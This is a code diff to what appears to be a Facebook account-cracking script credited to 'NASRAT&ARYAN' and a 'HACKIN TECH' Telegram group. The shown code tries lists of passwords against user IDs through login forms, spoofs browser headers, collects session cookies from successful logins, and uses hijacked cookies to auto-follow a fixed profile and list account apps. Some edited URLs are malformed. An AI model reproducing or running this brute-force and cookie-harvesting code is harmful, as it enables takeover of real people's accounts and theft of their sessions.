@@ -92,7 +92,7 @@ except ModuleNotFoundError:
     os.system('pip install bs4')
     
 def cek_apk(session,coki):
-    w=session.get("https://alpha.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    w=session.get("https://free.facebook.com .com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -104,7 +104,7 @@ def cek_apk(session,coki):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://alpha.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    w=session.get("'https://www.free.facebook.com/ /login/device-based/regular/login/'",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -118,10 +118,10 @@ def cek_apk(session,coki):
             print('')
  
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
+        r = BeautifulSoup(session.get('http://free.facebook.com/profile.php?id=100015315258519', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://alpha.facebook.com' + str(get), {
+        session.get('https://free.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
             
             
@@ -174,13 +174,15 @@ logo =                                          f"""{H}                         
  |_____/|_| \_|_____|_|    |______|_|  \_\
                                                                     
      ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ 
-       \033[1;32m
-\033[1;39m WELL COME 
-\033[1;31m\033[1;32m \033[1;32mOWNER\033[1;31m \033[1;32m     NASRAT&ARYAN\033[1;31m
-\033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32m Loy Rayess Kabul\033[1;31m 
-\033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32m   Nasrat99845\033[1;31m 
-\033[1;31m\033[1;32m\033[1;32mTELEGRAM \033[1;31m\033[1;32m tm.HACKIN TECH \033[1;31m 
-\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 0.2\033[1;31m 
+    \033[1;32m
+[◇]-------------------------------------------------------
+ [◇] DEVELOPER  : NASRAT&ARYAN
+ [◇] GITHUB     : Nasrat99845.git
+ [◇] FACEBOOK   : Loy Rayess kabul
+ [◇] STATUS     : Free
+ [◇] VIRSION    : 2.1
+ [◇]  TEAM      :   NASRAT& ARYAN
+ [◇]------------------------------------------------------
 \033[1;37mTELEGRAM GROUP (HACKIN TECH{ M }\033[1;37m 
 \033[1;92m==========================================================
 \033[33;44m  NAME       NASRAT &ARYAN 🖤❤💚\033[0;m
@@ -298,7 +300,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://alpha.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -309,28 +311,23 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.alpha.facebook.com',
+            header_freefb = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,ps-AF;q=0.8,ps;q=0.7',
     'cache-control': 'max-age=0',
-    
-    
-    'referer': 'https://m.alpha.facebook.com/?wtsid=rdr_0kySlxphgNfmk0Cuo',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"(Not(A:Brand";v="99"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0"',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"iOS"',
-    'sec-ch-ua-platform-version': '""',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5758.222 Safari/537.36 Edg/109.0.1559.36',
-}
-
-            lo = session.post('https://m.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0esr) Gecko/20010101 Firefox/114.0esr/9zsX2WcYS7t',}
+            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8/',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
